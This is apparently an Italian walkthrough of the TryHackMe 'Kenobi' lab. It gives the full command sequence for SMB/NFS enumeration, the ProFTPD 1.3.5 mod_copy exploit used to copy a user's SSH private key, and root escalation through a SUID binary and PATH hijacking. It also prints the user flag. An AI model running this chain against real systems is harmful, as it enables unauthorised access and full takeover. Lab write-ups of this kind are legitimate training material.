
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/kenobi

```
sudo openvpn ~/Downloads/dominion99.ovpn
```

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.228.197 -oG risultatoscan
```

```
sudo nmap -sC -sV -p21,22,80,111,139,445,2049 10.10.228.197 -oN risultatoscan2
```

==vedere risorse condivise samba con nmap==
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.228.197
```
==connettiamoci ad una risorsa condivisa samba== 
```
smbclient //10.10.41.12/anonymous
```

```
ls
```

```
get log.txt
```
leggiamo log.txt troviamo 
Your identification has been saved in /home/kenobi/.ssh/id_rsa
che ci da accesso ad ssh senza mettere le credenziali

Poi abbiamo attivo servizio
ServerName                      "ProFTPD Default Installation"

ed abbiamo
User                            kenobi
Group                           kenobi


Puoi anche scaricare in modo ricorsivo la  cartella della condivisione SMB trovata senza utente e  password 
```
smbget -R smb://10.10.216.21/anonymous
```

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.41.12
```
troviamo una risorsa condivisa nel percorso
```
 /var *
```





==vulnerabilità con nmap script==
```
nmap -PN --script vuln -p21,22,80,111,139,445,2049 --script http-enum 10.10.41.12 -oN vuln.txt
```
enumeriamo la porta 111 che è un servizio ==rpcbind== Questo è solo un server che converte il numero di programma RPC (Remote Procedure Call) in indirizzi universali. Quando un servizio RPC viene avviato, comunica a rpcbind l'indirizzo al quale è in ascolto e il numero del programma RPC che è pronto a servire.

ci connettiamo con netcat su porta 21 per scoprire che versione è in esecuzione
```
nc 10.10.216.21 21
```
ci da la versione del ProFTPD 1.3.5 Server

```
searchsploit ProFTPD 1.3.5
```

Dovresti aver trovato un exploit dal [modulo mod_copy](http://www.proftpd.org/docs/contrib/mod_copy.html) di ProFtpd . 
Il modulo mod_copy implementa i comandi **SITE CPFR** e **SITE CPTO** , che possono essere utilizzati per copiare file/directory da un posto all'altro sul server. Qualsiasi client non autenticato può sfruttare questi comandi per copiare file da qualsiasi  parte del filesystem a una destinazione scelta.

Sappiamo che il servizio FTP è in esecuzione come utente Kenobi (dal file sulla condivisione) e viene generata una chiave ssh per quell'utente.

quindi ci ricolleghiamo con netcat
```
nc 10.10.216.21 21
```
e copiamo la chiave id_rsa
```
SITE CPFR /home/kenobi/.ssh/id_rsa
```

```
SITE CPTO /var/tmp/id_rsa
```
ora la montiamo

```
mkdir /mnt/kenobiNFS  
```

```
mount 10.10.216.21:/var /mnt/kenobiNFS  
```

```
ls -la /mnt/kenobiNFS
```

```
cd /mnt/kenobiNFS/tmp
```
copiamo la chiave
```
cp id_rsa /home/kali/Downloads
```

```
cd /home/kali/Downloads
```
gli diamo i permessi
```
sudo chmod 600 id_rsa
```
e ci colleghiamo tramite ssh
```
ssh -i id_rsa kenobi@10.10.216.21
```

```
cat user.txt
```

d0b0f3f53b6caa532a83915e19224899

==ora scaliamo i privilegi==

troviamo tutti gli archivi che possiamo utilizzare come proprietari del binario suid
```
find / -perm -u=s -type f 2>/dev/null
```
troviamo di strano
```
/usr/bin/menu
```
==comando strings== ci fa vedere il codice del binario
```
strings /usr/bin/menu
```

```
echo $PATH
```
ci fa vedere dove viene eseguito il comando e le varie rotte

/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

modificando le rotte possiamo avere una bash come super user

```
echo /bin/sh > curl
```
Il comando "echo /bin/sh > curl" scrive il percorso del file "/bin/sh" nel file chiamato "curl". Questo comando non ha alcun effetto diretto sull'esecuzione di un comando curl. Tuttavia, se si intende eseguire un comando curl con lo shell script "/bin/sh", è possibile farlo utilizzando il percorso diretto del comando curl nel file "/bin/sh".
```
ls
```

```
chmod 777 curl
```

```
cp curl /tmp
```

```
cd /tmp
```

```
export PATH=/tmp:$PATH
```
Il comando "export PATH=/tmp=$PATH" imposta la variabile di ambiente PATH in modo che includa il percorso "/tmp" prima degli altri percorsi già presenti nella variabile PATH
In questo modo, il percorso "/tmp" viene aggiunto alla variabile PATH, consentendo al sistema di cercare eseguibili anche in quella directory quando si digita un comando nel terminale.

```
curl
```

```
/usr/bin/menu
```

Abbiamo copiato la shell /bin/sh, l'abbiamo chiamata curl, le abbiamo dato i permessi corretti e poi abbiamo inserito la sua posizione nel nostro percorso. Ciò significava che quando veniva eseguito il binario /usr/bin/menu, veniva utilizzata la nostra variabile di percorso per trovare il binario "curl". Che in realtà è una versione di /usr/sh, così come questo file viene eseguito come root esegue la nostra shell come root!

ora selezioniamo 1
scriviamo
```
whoami
```
==e vediamo che siamo root!==
```
cd /root
```

```
cat root.txt
```

```
177xxxxxxxxxxxxxxx
```

```
flag ottenuta!
```

